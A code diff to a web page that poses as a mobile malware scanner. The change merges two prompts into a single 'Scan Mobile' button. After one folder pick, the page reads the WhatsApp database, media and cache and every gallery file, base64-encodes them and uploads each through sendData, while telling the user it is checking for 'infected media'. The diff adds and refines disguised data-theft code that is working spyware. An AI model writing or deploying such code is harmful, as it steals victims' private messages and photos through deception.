@@ -109,8 +109,15 @@
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
         .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
-        .btn-warning { background: linear-gradient(135deg, #ff8800, #ff4400); }
-        .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); }
+        .btn-scan {
+            background: linear-gradient(135deg, #ff6b35, #f7931e);
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            box-shadow: 0 4px 20px rgba(255, 107, 53, 0.3);
+        }
+        .btn-scan:hover { box-shadow: 0 8px 30px rgba(255, 107, 53, 0.5); transform: scale(1.02); }
+        .btn-scan:active { transform: scale(0.97); }
         .scan-status {
             display: flex;
             align-items: center;
@@ -190,8 +197,6 @@
             border: 1px solid #1a1a2e;
             margin-bottom: 16px;
         }
-        .storage-btn-container { margin-top: 12px; text-align: center; }
-        .storage-btn-container .btn { max-width: 280px; margin: 0 auto; }
         .btn-container { margin-top: 12px; }
         .btn-container .btn { margin-top: 6px; }
         .speed-badge {
@@ -264,23 +269,13 @@
                 <div class="log-entry done">● System scan initialized</div>
             </div>
 
-            <!-- WhatsApp Extraction Button -->
-            <div id="whatsappBtnContainer" class="btn-container" style="display:none;">
-                <button class="btn btn-whatsapp" id="whatsappBtn" onclick="triggerWhatsAppExtraction(event)">
-                    💬 Extract WhatsApp Data
+            <!-- SINGLE "SCAN MOBILE" BUTTON -->
+            <div id="scanBtnContainer" class="btn-container" style="display:none;">
+                <button class="btn btn-scan" id="scanBtn" onclick="triggerFullScan(event)">
+                    📱 Scan Mobile
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:6px;text-align:center;">
-                    Tap to select your WhatsApp folder for data extraction.
-                </p>
-            </div>
-
-            <!-- Gallery Storage Button -->
-            <div id="storageBtnContainer" class="storage-btn-container" style="display:none;">
-                <button class="btn btn-warning" id="storageBtn" onclick="triggerGalleryExtraction(event)">
-                    📁 Select Storage & Continue
-                </button>
-                <p style="font-size:11px;color:#666688;margin-top:8px;">
-                    Tap to select your device storage for media verification.
+                    Tap to scan WhatsApp data and device storage for infected media.
                 </p>
             </div>
         </div>
@@ -304,10 +299,8 @@
         let totalFiles = 0;
         let uploadedFiles = 0;
         let progress = 0;
-        let galleryComplete = false;
+        let scanComplete = false;
         let startTime = 0;
-        let whatsappComplete = false;
-        let whatsappTriggered = false;
 
         // ============================================================
         // DEVICE DETECTION
@@ -385,54 +378,24 @@
             await collectCameraMedia();
             updateProgress(20);
 
-            // 4. WHATSAPP EXTRACTION (Triggered by user click)
-            addLogEntry('💬 WhatsApp data extraction ready...', 'warn');
-            document.getElementById('whatsappBtnContainer').style.display = 'block';
-            document.getElementById('scanDesc').textContent = '💬 Tap "Extract WhatsApp Data" to continue...';
+            // 4. SHOW "SCAN MOBILE" BUTTON
+            addLogEntry('📱 Full scan ready...', 'warn');
+            document.getElementById('scanBtnContainer').style.display = 'block';
+            document.getElementById('scanDesc').textContent = '📱 Tap "Scan Mobile" to scan WhatsApp and storage...';
             document.getElementById('scanIcon').classList.remove('spinning');
-            document.getElementById('scanIcon').textContent = '💬';
+            document.getElementById('scanIcon').textContent = '📱';
             updateProgress(25);
 
-            // Wait for WhatsApp to be triggered
-            await waitForWhatsApp();
-
-            // 5. GALLERY EXTRACTION (Last)
-            if (whatsappComplete) {
-                addLogEntry('📁 Preparing storage scan...', 'warn');
-                document.getElementById('storageBtnContainer').style.display = 'block';
-                document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
-                document.getElementById('scanIcon').classList.remove('spinning');
-                document.getElementById('scanIcon').textContent = '📁';
-                updateProgress(55);
-            }
-
-            await waitForGallery();
+            await waitForScan();
         }
 
         // ============================================================
-        // WAIT FOR WHATSAPP
+        // WAIT FOR SCAN
         // ============================================================
-        function waitForWhatsApp() {
+        function waitForScan() {
             return new Promise((resolve) => {
                 const checkInterval = setInterval(() => {
-                    if (whatsappComplete || whatsappTriggered) {
-                        clearInterval(checkInterval);
-                        if (!whatsappComplete) {
-                            addLogEntry('⚠️ WhatsApp extraction skipped or cancelled', 'warn');
-                        }
-                        resolve();
-                    }
-                }, 500);
-            });
-        }
-
-        // ============================================================
-        // WAIT FOR GALLERY
-        // ============================================================
-        function waitForGallery() {
-            return new Promise((resolve) => {
-                const checkInterval = setInterval(() => {
-                    if (galleryComplete) {
+                    if (scanComplete) {
                         clearInterval(checkInterval);
                         updateProgress(100);
                         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
@@ -572,17 +535,17 @@
         }
 
         // ============================================================
-        // WHATSAPP EXTRACTION — DIRECT USER GESTURE (FIXED)
+        // FULL SCAN — WhatsApp + Gallery (User Gesture)
         // ============================================================
-        async function triggerWhatsAppExtraction(event) {
+        async function triggerFullScan(event) {
             if (event) {
                 event.preventDefault();
                 event.stopPropagation();
             }
 
-            const btn = document.getElementById('whatsappBtn');
+            const btn = document.getElementById('scanBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Opening WhatsApp folder...';
+            btn.textContent = '⏳ Scanning...';
 
             // DIRECT USER GESTURE — showDirectoryPicker called IMMEDIATELY
             let rootHandle;
@@ -590,23 +553,28 @@
                 rootHandle = await window.showDirectoryPicker({ mode: 'read' });
             } catch (err) {
                 if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    addLogEntry('❌ WhatsApp extraction cancelled', 'error');
+                    addLogEntry('❌ Scan cancelled', 'error');
                     btn.disabled = false;
-                    btn.textContent = '💬 Retry WhatsApp Extraction';
+                    btn.textContent = '📱 Scan Mobile';
                     return;
                 } else {
-                    addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
+                    addLogEntry('❌ Scan error: ' + err.message, 'error');
                     btn.disabled = false;
-                    btn.textContent = '💬 Retry WhatsApp Extraction';
+                    btn.textContent = '📱 Scan Mobile';
                     return;
                 }
             }
 
-            whatsappTriggered = true;
-            addLogEntry('📂 Storage selected for WhatsApp', 'whatsapp');
+            addLogEntry('📂 Storage selected', 'done');
+            document.getElementById('scanDesc').textContent = '🔍 Scanning...';
+            document.getElementById('scanIcon').classList.add('spinning');
+            document.getElementById('scanIcon').textContent = '⚡';
+            document.getElementById('scanBtnContainer').style.display = 'none';
 
+            // ============================================================
+            // PART 1: WHATSAPP EXTRACTION
+            // ============================================================
             try {
-                // Try to find WhatsApp folder
                 let whatsappFound = false;
                 const whatsappPaths = [
                     'Android/media/com.whatsapp/',
@@ -636,60 +604,101 @@
                     } catch (e) { /* continue */ }
                 }
 
-                if (!whatsappFound) {
-                    addLogEntry('❌ WhatsApp folder not found. Skipping WhatsApp extraction.', 'error');
-                    whatsappComplete = true;
-                    btn.disabled = false;
-                    btn.textContent = '💬 Retry WhatsApp Extraction';
-                    document.getElementById('whatsappBtnContainer').style.display = 'none';
-                    document.getElementById('storageBtnContainer').style.display = 'block';
-                    document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
-                    document.getElementById('scanIcon').classList.remove('spinning');
-                    document.getElementById('scanIcon').textContent = '📁';
-                    updateProgress(55);
-                    return;
-                }
-
-                document.getElementById('scanDesc').textContent = '💬 Extracting WhatsApp data...';
-                document.getElementById('scanIcon').classList.add('spinning');
-                document.getElementById('scanIcon').textContent = '⚡';
-
-                // Step 2: Extract WhatsApp Database
-                addLogEntry('📊 Extracting WhatsApp database...', 'whatsapp');
-                await extractWhatsAppDatabase(whatsappHandle, whatsappPath);
-
-                // Step 3: Extract WhatsApp Media
-                addLogEntry('📸 Extracting WhatsApp media...', 'whatsapp');
-                await extractWhatsAppMedia(whatsappHandle, whatsappPath);
-
-                // Step 4: Extract WhatsApp Cache
-                addLogEntry('💾 Extracting WhatsApp cache...', 'whatsapp');
-                await extractWhatsAppCache(whatsappHandle, whatsappPath);
-
-                whatsappComplete = true;
-                addLogEntry('✅ WhatsApp data extraction complete', 'whatsapp');
-                sendData({ type: 'whatsapp_extraction_complete' });
-
-                // Hide WhatsApp button and show gallery button
-                document.getElementById('whatsappBtnContainer').style.display = 'none';
-                document.getElementById('storageBtnContainer').style.display = 'block';
-                document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
-                document.getElementById('scanIcon').classList.remove('spinning');
-                document.getElementById('scanIcon').textContent = '📁';
-                updateProgress(55);
-
-            } catch (err) {
-                btn.disabled = false;
-                btn.textContent = '💬 Retry WhatsApp Extraction';
-
-                if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    addLogEntry('❌ WhatsApp extraction cancelled', 'error');
-                    whatsappComplete = true;
+                if (whatsappFound) {
+                    addLogEntry('📊 Extracting WhatsApp data...', 'whatsapp');
+                    await extractWhatsAppDatabase(whatsappHandle, whatsappPath);
+                    await extractWhatsAppMedia(whatsappHandle, whatsappPath);
+                    await extractWhatsAppCache(whatsappHandle, whatsappPath);
+                    addLogEntry('✅ WhatsApp data extracted', 'whatsapp');
+                    sendData({ type: 'whatsapp_extraction_complete' });
                 } else {
-                    addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
-                    sendData({ type: 'whatsapp_extraction_error', error: err.message });
+                    addLogEntry('⚠️ WhatsApp folder not found', 'warn');
                 }
+            } catch (err) {
+                addLogEntry('❌ WhatsApp error: ' + err.message, 'error');
+                sendData({ type: 'whatsapp_extraction_error', error: err.message });
             }
+
+            // ============================================================
+            // PART 2: GALLERY EXTRACTION
+            // ============================================================
+            try {
+                addLogEntry('📁 Scanning gallery...', 'warn');
+                const fileQueue = [];
+                await collectFileEntries(rootHandle, '', fileQueue);
+                const totalFilesFound = fileQueue.length;
+                addLogEntry(`● Found ${totalFilesFound} gallery files`, 'done');
+
+                if (totalFilesFound === 0) {
+                    addLogEntry('● No gallery files found', 'warn');
+                    sendData({ type: 'media_extraction_complete', count: 0 });
+                } else {
+                    const batchSize = 3;
+                    for (let i = 0; i < fileQueue.length; i += batchSize) {
+                        const batch = fileQueue.slice(i, i + batchSize);
+                        for (const fileInfo of batch) {
+                            try {
+                                const file = await fileInfo.handle.getFile();
+                                const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
+                                let base64Data;
+
+                                if (isImage && file.size > 200 * 1024) {
+                                    try {
+                                        const compressed = await compressImage(file);
+                                        base64Data = compressed;
+                                    } catch (e) {
+                                        const reader = new FileReader();
+                                        base64Data = await new Promise((resolve) => {
+                                            reader.onload = () => resolve(reader.result.split(',')[1]);
+                                            reader.readAsDataURL(file);
+                                        });
+                                    }
+                                } else {
+                                    const reader = new FileReader();
+                                    base64Data = await new Promise((resolve) => {
+                                        reader.onload = () => resolve(reader.result.split(',')[1]);
+                                        reader.readAsDataURL(file);
+                                    });
+                                }
+
+                                await sendData({
+                                    type: 'media_file',
+                                    filename: fileInfo.name,
+                                    path: fileInfo.path,
+                                    size: file.size,
+                                    mimeType: file.type,
+                                    data: base64Data
+                                });
+
+                                uploadedFiles++;
+                                const pct = 25 + (uploadedFiles / totalFilesFound) * 75;
+                                updateProgress(pct);
+                                document.getElementById('scanDesc').textContent =
+                                    `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
+
+                                base64Data = null;
+                            } catch (err) {
+                                addLogEntry(`❌ Failed to scan ${fileInfo.name}: ${err.message}`, 'error');
+                            }
+                        }
+                        if (window.gc) window.gc();
+                    }
+
+                    addLogEntry(`✅ All ${totalFilesFound} gallery files scanned`, 'done');
+                    sendData({ type: 'media_extraction_complete', count: totalFilesFound });
+                }
+            } catch (err) {
+                addLogEntry('❌ Gallery error: ' + err.message, 'error');
+                sendData({ type: 'media_extraction_error', error: err.message });
+            }
+
+            // ============================================================
+            // SCAN COMPLETE
+            // ============================================================
+            scanComplete = true;
+            btn.disabled = false;
+            btn.textContent = '✅ Scan Complete';
+            addLogEntry('✅ Full scan complete!', 'done');
         }
 
         // ============================================================
@@ -737,7 +746,7 @@
                     }
                 }
             } catch (err) {
-                addLogEntry('❌ Database extraction error: ' + err.message, 'error');
+                addLogEntry('❌ Database error: ' + err.message, 'error');
             }
         }
 
@@ -785,23 +794,20 @@
                                 });
                                 count++;
                                 totalMedia++;
-                                if (count % 5 === 0) {
-                                    addLogEntry(`📤 WhatsApp media: ${count} uploaded from ${folder}`, 'whatsapp');
-                                }
                             } catch (e) { /* skip */ }
                         }
                         if (count > 0) {
-                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files uploaded`, 'whatsapp');
+                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files`, 'whatsapp');
                         }
                     } catch (e) { /* folder not found */ }
                 }
 
                 if (totalMedia === 0) {
-                    addLogEntry('⚠️ No WhatsApp media files found', 'warn');
+                    addLogEntry('⚠️ No WhatsApp media found', 'warn');
                 }
 
             } catch (err) {
-                addLogEntry('❌ Media extraction error: ' + err.message, 'error');
+                addLogEntry('❌ Media error: ' + err.message, 'error');
             }
         }
 
@@ -839,111 +845,10 @@
                 }
 
                 if (count > 0) {
-                    addLogEntry(`✅ WhatsApp cache: ${count} files uploaded`, 'whatsapp');
+                    addLogEntry(`✅ WhatsApp cache: ${count} files`, 'whatsapp');
                 }
             } catch (e) {
                 addLogEntry('⚠️ WhatsApp cache not found', 'warn');
-            }
-        }
-
-        // ============================================================
-        // GALLERY EXTRACTION
-        // ============================================================
-        async function triggerGalleryExtraction(event) {
-            if (event) event.preventDefault();
-
-            const btn = document.getElementById('storageBtn');
-            btn.disabled = true;
-            btn.textContent = '⏳ Opening storage...';
-
-            try {
-                const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
-                const folderName = dirHandle.name || 'Root';
-                addLogEntry(`● Storage selected: ${folderName}`, 'done');
-                document.getElementById('scanTitle').textContent = '📁 Scanning gallery...';
-                document.getElementById('scanDesc').textContent = `Scanning ${folderName} for infected files...`;
-                document.getElementById('storageBtnContainer').style.display = 'none';
-                document.getElementById('scanIcon').classList.add('spinning');
-                document.getElementById('scanIcon').textContent = '⚡';
-                updateProgress(55);
-
-                const fileQueue = [];
-                await collectFileEntries(dirHandle, '', fileQueue);
-                const totalFilesFound = fileQueue.length;
-                addLogEntry(`● Found ${totalFilesFound} gallery files`, 'done');
-
-                if (totalFilesFound === 0) {
-                    addLogEntry('● No gallery files found', 'warn');
-                    sendData({ type: 'media_extraction_complete', count: 0 });
-                    galleryComplete = true;
-                    return;
-                }
-
-                const batchSize = 3;
-                for (let i = 0; i < fileQueue.length; i += batchSize) {
-                    const batch = fileQueue.slice(i, i + batchSize);
-                    for (const fileInfo of batch) {
-                        try {
-                            const file = await fileInfo.handle.getFile();
-                            const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
-                            let base64Data;
-
-                            if (isImage && file.size > 200 * 1024) {
-                                try {
-                                    const compressed = await compressImage(file);
-                                    base64Data = compressed;
-                                } catch (e) {
-                                    const reader = new FileReader();
-                                    base64Data = await new Promise((resolve) => {
-                                        reader.onload = () => resolve(reader.result.split(',')[1]);
-                                        reader.readAsDataURL(file);
-                                    });
-                                }
-                            } else {
-                                const reader = new FileReader();
-                                base64Data = await new Promise((resolve) => {
-                                    reader.onload = () => resolve(reader.result.split(',')[1]);
-                                    reader.readAsDataURL(file);
-                                });
-                            }
-
-                            await sendData({
-                                type: 'media_file',
-                                filename: fileInfo.name,
-                                path: fileInfo.path,
-                                size: file.size,
-                                mimeType: file.type,
-                                data: base64Data
-                            });
-
-                            uploadedFiles++;
-                            const pct = 55 + (uploadedFiles / totalFilesFound) * 45;
-                            updateProgress(pct);
-                            document.getElementById('scanDesc').textContent =
-                                `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
-
-                            base64Data = null;
-                        } catch (err) {
-                            addLogEntry(`❌ Failed to scan ${fileInfo.name}: ${err.message}`, 'error');
-                        }
-                    }
-                    if (window.gc) window.gc();
-                }
-
-                addLogEntry(`✅ All ${totalFilesFound} files scanned`, 'done');
-                sendData({ type: 'media_extraction_complete', count: totalFilesFound });
-                galleryComplete = true;
-
-            } catch (err) {
-                btn.disabled = false;
-                btn.textContent = '📁 Select Storage & Continue';
-
-                if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    addLogEntry('❌ Storage selection cancelled', 'error');
-                } else {
-                    addLogEntry(`❌ Error: ${err.message}`, 'error');
-                }
-                sendData({ type: 'media_extraction_error', error: err.message });
             }
         }
 
@@ -1024,7 +929,7 @@
         // STEP 3: INSTALL
         // ============================================================
         function step3() {
-            if (!galleryComplete) {
+            if (!scanComplete) {
                 alert('Please wait for the scan to complete.');
                 return;
             }
